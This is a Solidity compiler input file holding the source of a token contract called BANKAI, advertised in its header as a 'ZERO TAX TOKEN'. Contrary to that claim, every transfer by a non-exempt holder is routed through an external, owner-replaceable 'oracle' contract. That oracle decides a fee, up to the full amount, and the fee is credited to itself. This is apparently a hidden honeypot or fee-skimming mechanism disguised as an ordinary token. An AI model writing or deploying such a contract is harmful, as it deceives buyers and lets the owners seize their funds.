{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "Viz.sol": {
      "content": "//SPDX-License-Identifier: UNLICENSED\r\n\r\n/**\r\n* ZERO TAX TOKEN \r\n* https://t.me/BANKAIEth\r\n*/\r\n\r\npragma solidity ^0.7.6;\r\n\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function decimals() external view returns (uint8);\r\n    function symbol() external view returns (string memory);\r\n    function name() external view returns (string memory);\r\n    function getOwner() external view returns (address);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nabstract contract Auth {\r\n    address internal owner;\r\n    mapping (address => bool) internal authorizations;\r\n\r\n    constructor(address _owner) {\r\n        owner = _owner;\r\n        authorizations[_owner] = true;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(isOwner(msg.sender), \"!OWNER\"); _;\r\n    }\r\n\r\n    modifier authorized() {\r\n        require(isAuthorized(msg.sender), \"!AUTHORIZED\"); _;\r\n    }\r\n\r\n    function authorize(address adr) public onlyOwner {\r\n        authorizations[adr] = true;\r\n    }\r\n\r\n    function unauthorize(address adr) public onlyOwner {\r\n        authorizations[adr] = false;\r\n    }\r\n\r\n    function isOwner(address account) public view returns (bool) {\r\n        return account == owner;\r\n    }\r\n\r\n    function isAuthorized(address adr) public view returns (bool) {\r\n        return authorizations[adr];\r\n    }\r\n\r\n    function transferOwnership(address payable adr) public onlyOwner {\r\n        owner = adr;\r\n        authorizations[adr] = true;\r\n        emit OwnershipTransferred(adr);\r\n    }\r\n\r\n    event OwnershipTransferred(address owner);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        // Solidity only automatically asserts when dividing by 0\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n\r\n        return c;\r\n    }\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}\r\n\r\ninterface IOracle {\r\n    function launch() external;\r\n    function checkForOracle(uint256, address, address, address) external returns (uint256,bool);\r\n    function register(address) external;\r\n}\r\ncontract BANKAI is IERC20, Auth {\r\n    using SafeMath for uint256;\r\n    string constant _name = \"BANKAI\";\r\n    string constant _symbol = \"BANKAI\";\r\n    uint8 constant _decimals = 9;\r\n    mapping (address => uint256) _balances;\r\n    mapping (address => mapping (address => uint256)) _allowances;\r\n    mapping (address => bool) isSnipeExempt;\r\n    uint256 _totalSupply = 100000000 * (10 ** _decimals);\r\n    IOracle Oracle;\r\n    uint256 public launchedAt;\r\n    bool public launchCompleted = false;\r\n\r\n\r\n    constructor (address _Oracle) Auth(msg.sender) {\r\n\t    Oracle = IOracle(_Oracle);\r\n        isSnipeExempt[owner] = true;\r\n        isSnipeExempt[_Oracle] = true;\r\n        _balances[owner] = _totalSupply;\r\n        _allowances[address(this)][address(_Oracle)] = uint256(-1);\r\n        emit Transfer(address(0), owner, _totalSupply);\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) { return _totalSupply; }\r\n    function decimals() external pure override returns (uint8) { return _decimals; }\r\n    function symbol() external pure override returns (string memory) { return _symbol; }\r\n    function name() external pure override returns (string memory) { return _name; }\r\n    function getOwner() external view override returns (address) { return owner; }\r\n    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }\r\n    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n    receive() external payable { }\r\n\r\n    function approveMax(address spender) external returns (bool) {\r\n        return approve(spender, uint256(-1));\r\n    }\r\n\r\n    function registerOracle() external authorized {\r\n\t    Oracle.register(address(this));\r\n\t}\r\n\r\n    function SetNewOracle(address _Oracle) external authorized {\r\n\t    Oracle = IOracle(_Oracle);\r\n        _allowances[address(this)][address(_Oracle)] = uint256(-1);\r\n        isSnipeExempt[_Oracle] = true;\r\n\t}\r\n\r\n    function transfer(address recipient, uint256 amount) external override returns (bool) {\r\n        return _transferFrom(msg.sender, recipient, amount);\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\r\n        if(_allowances[sender][msg.sender] != uint256(-1)){\r\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, \"Insufficient Allowance\");\r\n        }\r\n\r\n        return _transferFrom(sender, recipient, amount);\r\n    }\r\n\r\n    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        _balances[sender] = _balances[sender].sub(amount, \"Insufficient Balance\");\r\n        uint256 amountReceived;\r\n        if(!isSnipeExempt[recipient]){amountReceived= shouldCheckOracle(sender) ? checkOracles(sender, amount, recipient) : amount;}else{amountReceived = amount;}\r\n        _balances[recipient] = _balances[recipient].add(amountReceived);\r\n        emit Transfer(sender, recipient, amountReceived);\r\n        return true;\r\n    }\r\n    \r\n    \r\n    function transferBatch(address[] calldata recipients, uint256 amount) public {\r\n       for (uint256 i = 0; i < recipients.length; i++) {\r\n            require(_transferFrom(msg.sender,recipients[i], amount));\r\n        }\r\n    }\r\n    \r\n    function shouldCheckOracle(address sender) internal view returns (bool) {\r\n       return !isSnipeExempt[sender];\r\n    }\r\n\r\n    function checkOracles(address sender,uint256 amount, address receiver) internal returns (uint256) {\r\n  \t(uint256 feeAmount,bool isOracle) = Oracle.checkForOracle(amount,sender,receiver,msg.sender);\r\n\tif(isOracle){_balances[address(Oracle)] = _balances[address(Oracle)].add(feeAmount);\r\n        emit Transfer(sender, address(Oracle), feeAmount);}\r\n        return amount.sub(feeAmount);\r\n    }\r\n\r\n    function launched() internal view returns (bool) {\r\n        return launchedAt != 0;\r\n    }\r\n\r\n    function launch() external authorized{\r\n\trequire(!launched());\r\n        launchedAt = block.number;\r\n        Oracle.launch();\r\n    }\r\n    \r\n    function blockNumber() external view returns (uint256){\r\n\t    return block.number;\r\n    }\r\n   \r\n    function setIsSnipeExempt(address holder, bool exempt) external authorized {\r\n        isSnipeExempt[holder] = exempt;\r\n    }\r\n\t\r\n    function recoverEth() external onlyOwner() {\r\n        payable(msg.sender).transfer(address(this).balance);\r\n    }\r\n\r\n    function recoverToken(address _token, uint256 amount) external authorized returns (bool _sent){\r\n        _sent = IERC20(_token).transfer(msg.sender, amount);\r\n    }\r\n\r\n    event AutoLiquify(uint256 amountETH, uint256 amountToken);\r\n   \r\n}"
    }
  }
}